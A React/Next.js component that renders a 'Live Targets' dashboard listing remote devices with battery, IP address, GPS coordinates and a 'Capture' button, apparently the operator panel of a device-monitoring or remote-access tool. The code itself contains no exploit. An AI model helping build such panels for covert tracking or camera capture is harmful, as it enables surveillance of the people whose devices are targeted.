'use client';

import React, { useMemo, useState } from 'react';
import Link from 'next/link';
import { clsx } from 'clsx';
import { twMerge } from 'tailwind-merge';
import {
  Search,
  Camera,
  MapPin,
  BatteryFull,
  BatteryMedium,
  BatteryLow,
  Circle,
  type LucideIcon,
} from 'lucide-react';
import { Target } from '@/types/target';

const cn = (...inputs: Array<string | false | null | undefined>) => twMerge(clsx(inputs));

const getBatteryState = (battery?: number) => {
  if (typeof battery !== 'number') {
    return { icon: BatteryLow, color: 'text-slate-500', label: 'Unknown' };
  }

  if (battery > 50) {
    return { icon: BatteryFull, color: 'text-emerald-400', label: 'High' };
  }

  if (battery >= 20) {
    return { icon: BatteryMedium, color: 'text-amber-400', label: 'Medium' };
  }

  return { icon: BatteryLow, color: 'text-rose-400', label: 'Low' };
};

interface TargetListProps {
  targets: Target[];
  selectedTargetId?: string;
  loading: boolean;
  busyTargetId?: string | null;
  onSelect: (deviceId: string) => void;
  onCapture: (deviceId: string) => void;
}

export default function TargetList({
  targets,
  selectedTargetId,
  loading,
  busyTargetId,
  onSelect,
  onCapture,
}: TargetListProps) {
  const [searchTerm, setSearchTerm] = useState('');

  const filteredTargets = useMemo(() => {
    const term = searchTerm.toLowerCase().trim();
    return targets.filter((target) => {
      return !term ||
        target.id?.toLowerCase().includes(term) ||
        (target.deviceInfo?.model || target.model || '').toLowerCase().includes(term);
    });
  }, [searchTerm, targets]);

  return (
    <div className="space-y-4">
      {/* ── Header + Search ── */}
      <div className="rounded-2xl border border-white/[0.06] bg-white/[0.02] backdrop-blur-xl p-5">
        <div className="flex flex-col gap-4 lg:flex-row lg:items-center lg:justify-between">
          <div>
            <h2 className="text-lg font-bold text-white">Live Targets</h2>
            <p className="text-xs text-slate-500 mt-0.5">
              {loading ? 'Loading...' : `${filteredTargets.length} device${filteredTargets.length !== 1 ? 's' : ''} found`}
            </p>
          </div>

          <div className="w-full max-w-xs">
            <label className="relative block">
              <Search size={16} className="pointer-events-none absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-500" />
              <input
                type="text"
                value={searchTerm}
                onChange={(event) => setSearchTerm(event.target.value)}
                placeholder="Search device..."
                className="w-full rounded-xl border border-white/[0.08] bg-white/[0.03] py-2.5 pl-10 pr-4 text-sm text-white outline-none transition placeholder:text-slate-600 focus:border-emerald-500/30 focus:ring-1 focus:ring-emerald-500/20"
              />
            </label>
          </div>
        </div>
      </div>

      {/* ── Device Grid ── */}
      <div className="rounded-2xl border border-white/[0.06] bg-white/[0.02] backdrop-blur-xl p-5">
        {loading ? (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
            {[...Array(4)].map((_, i) => (
              <div key={i} className="rounded-xl border border-white/[0.06] bg-white/[0.02] p-4 animate-pulse h-44" />
            ))}
          </div>
        ) : filteredTargets.length === 0 ? (
          <div className="py-16 text-center text-slate-600">
            <p className="text-sm">No targets match your search</p>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
            {filteredTargets.map((target) => {
              const isOnline = target.status?.toUpperCase() === 'ONLINE';
              const batteryState = getBatteryState(target.battery);
              const BatteryIcon = batteryState.icon as LucideIcon;
              const targetIp = target.deviceInfo?.ip || target.ip || 'Unknown IP';
              const deviceModel = target.deviceInfo?.model || target.model || 'Unknown';
              const manufacturer = target.deviceInfo?.manufacturer || '';

              return (
                <div
                  key={target.id}
                  onClick={() => onSelect(target.id)}
                  className={cn(
                    'rounded-xl border p-4 transition-all duration-200 cursor-pointer group',
                    target.id === selectedTargetId
                      ? 'border-emerald-500/30 bg-emerald-500/[0.06] shadow-lg shadow-emerald-500/5'
                      : 'border-white/[0.06] bg-white/[0.01] hover:border-white/[0.12] hover:bg-white/[0.03]'
                  )}
                >
                  {/* Header */}
                  <div className="flex items-start justify-between mb-3">
                    <div className="flex-1 min-w-0">
                      <h4 className="text-sm font-semibold text-white truncate">
                        {manufacturer} {deviceModel}
                      </h4>
                      <p className="text-[11px] text-slate-500 font-mono mt-0.5 truncate">{target.id}</p>
                    </div>
                    <div className={cn(
                      'flex items-center justify-center w-8 h-8 rounded-lg shrink-0 ml-2',
                      isOnline
                        ? 'bg-emerald-500/10 border border-emerald-500/20'
                        : 'bg-slate-500/10 border border-slate-500/20'
                    )}>
                      <Circle
                        size={8}
                        className={isOnline ? 'text-emerald-400 animate-pulse' : 'text-slate-500'}
                        fill="currentColor"
                      />
                    </div>
                  </div>

                  {/* Info rows */}
                  <div className="space-y-2 mb-3">
                    <InfoRow label="Status" value={isOnline ? 'ONLINE' : 'OFFLINE'} valueClass={isOnline ? 'text-emerald-400' : 'text-red-400'} />
                    <InfoRow
                      label="Battery"
                      value={typeof target.battery === 'number' ? `${target.battery}%` : 'N/A'}
                      valueClass={batteryState.color}
                      icon={<BatteryIcon size={12} className={batteryState.color} />}
                    />
                    <InfoRow label="IP" value={targetIp} valueClass="text-slate-300" />
                  </div>

                  {/* Location */}
                  {target.location?.lat && (
                    <div className="mb-3 p-2 rounded-lg bg-white/[0.02] border border-white/[0.04]">
                      <p className="text-[10px] text-slate-500 mb-0.5">📍 Location</p>
                      <p className="text-[10px] text-slate-400 font-mono">
                        {target.location.lat.toFixed(4)}, {target.location.lng?.toFixed(4)}
                      </p>
                    </div>
                  )}

                  {/* Actions */}
                  <div className="flex gap-2 pt-3 border-t border-white/[0.06]">
                    <button
                      type="button"
                      onClick={(event) => {
                        event.stopPropagation();
                        onCapture(target.id);
                      }}
                      disabled={busyTargetId === target.id}
                      className={cn(
                        'flex-1 inline-flex items-center justify-center gap-1.5 rounded-lg border px-3 py-2 text-xs font-semibold transition-all',
                        'border-emerald-500/20 bg-emerald-500/[0.06] text-emerald-400 hover:border-emerald-500/40 hover:bg-emerald-500/10',
                        busyTargetId === target.id && 'cursor-not-allowed opacity-50'
                      )}
                    >
                      <Camera size={12} />
                      {busyTargetId === target.id ? 'Capturing...' : 'Capture'}
                    </button>
                    <Link
                      href={`/dashboard/map/${target.id}`}
                      onClick={(event) => event.stopPropagation()}
                      className="inline-flex items-center justify-center rounded-lg border border-cyan-500/20 bg-cyan-500/[0.06] px-3 py-2 text-xs font-semibold text-cyan-400 transition-all hover:border-cyan-500/40 hover:bg-cyan-500/10"
                    >
                      <MapPin size={12} />
                    </Link>
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
}

/* ── Inline helper ── */
function InfoRow({ label, value, valueClass, icon }: { label: string; value: string; valueClass: string; icon?: React.ReactNode }) {
  return (
    <div className="flex items-center justify-between">
      <span className="text-[11px] text-slate-500">{label}</span>
      <div className="flex items-center gap-1.5">
        {icon}
        <span className={cn('text-[11px] font-mono font-semibold', valueClass)}>
          {value}
        </span>
      </div>
    </div>
  );
}
